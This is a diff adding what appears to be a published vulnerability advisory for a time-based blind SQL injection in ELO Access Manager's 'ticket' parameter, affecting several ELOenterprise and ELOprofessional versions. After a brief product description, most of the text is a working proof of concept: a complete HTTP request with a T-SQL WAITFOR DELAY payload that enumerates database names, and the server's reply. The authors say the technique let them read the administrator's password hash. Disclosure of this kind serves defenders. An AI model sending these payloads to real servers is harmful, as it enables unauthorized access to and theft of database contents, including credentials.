@@ -1,0 +1,57 @@
+# Title: Elektronischer Leitz-Ordner 10 - SQL Injection
+# Author: Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG
+# Software: https://www.elo.com/en-de/
+# CVE: N/A
+# Affected Products:
+# ELOenterprise 10 (ELO Access Manager <= 10.17.120)
+# ELOenterprise 9 (ELO Access Manager <= 9.17.120)
+# ELOprofessional 10 (ELO Access Manager <= 10.17.120)
+# ELOprofessional 9 (ELO Access Manager <= 9.17.120)
+
+
+
+# Description: 
+# ELO is a commercial software product for managing documents and
+# electronic content. Storage and organization is similar to classic
+# paper-based document management. ELO belongs to the category of document
+# management (DMS) and enterprise content management systems (ECM). DMS
+# and ECM systems enable audit-proof archiving of documents and
+# information requiring storage.
+
+# We have discovered a time-based blind SQL injection vulnerability in the
+# ELO Access Manager (<= 9.17.120 and <= 10.17.120) component that makes
+# it possible to read all database content. The vulnerability exists in
+# the HTTP GET parameter "ticket". For example, we succeeded in reading
+# the password hash of the administrator user in the "userdata" table from
+# the "eloam" database.
+
+# Proof of Concept:
+
+GET
+/wf-NAME/social/api/feed/aggregation/201803310000?ticket=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+IF(UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS
+NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases WHERE name NOT IN
+(SELECT TOP 7 name FROM master..sysdatabases ORDER BY name) ORDER BY
+name),5,1))>104) WAITFOR DELAY '0:0:1'--
+qvAV&after=1523013041889&lang=de&_dc=1523013101769 HTTP/1.1
+Accept-Encoding: gzip,deflate
+Connection: close
+Accept: */*
+Host: server:9090
+Referer: http://server:9090/wf-NAME/social/api/feed/aggregation/201803310000
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv: 59.0) Gecko/20100101
+Firefox/59.0
+
+HTTP/1.1 401 Unauthorized
+Server: Apache-Coyote/1.1
+Content-Type: application/json;charset=UTF-8
+Content-Length: 410
+Date: Fri, 06 Apr 2018 11:57:15 GMT
+Connection: close
+
+{"error":{"code":401,"message":"[TICKET:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\u0027
+IF(UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS
+NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases WHERE name NOT IN
+(SELECT TOP 7 name FROM master..sysdatabases ORDER BY name) ORDER BY
+name),5,1))\u003e104) WAITFOR DELAY \u00270][ELOIX:2001]Sitzungskennung
+ung..ltig oder abgelaufen. Melden Sie sich neu an.[NO-DETAILS]"}}
